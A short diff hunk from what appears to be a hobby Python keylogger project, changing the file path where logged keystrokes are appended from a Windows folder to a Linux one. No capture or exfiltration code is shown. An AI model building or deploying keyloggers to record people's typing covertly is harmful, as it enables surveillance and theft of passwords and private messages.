@@ -54,10 +54,9 @@ def check_time():
 def write_file(key_list, count_line):
     global NEW_LINE
     # For Linux Directory
-    #with open("/home/bladerunner/Documents/python/keylogger/log.txt",'a') as \\
-            #log:
+    with open("/home/bladerunner/Documents/python/keylogger/log.txt",'a') as log:
     # For Windows Directory
-    with open("E:\OneDrive - UNSW\Coding\python\keylogger\log.txt",'a') as log:
+    #with open("E:\OneDrive - UNSW\Coding\python\keylogger\log.txt",'a') as log:
         # This appends to a file.
         # This loop will update the text file every 'x' amount of keys.
         if check_time() == True: 
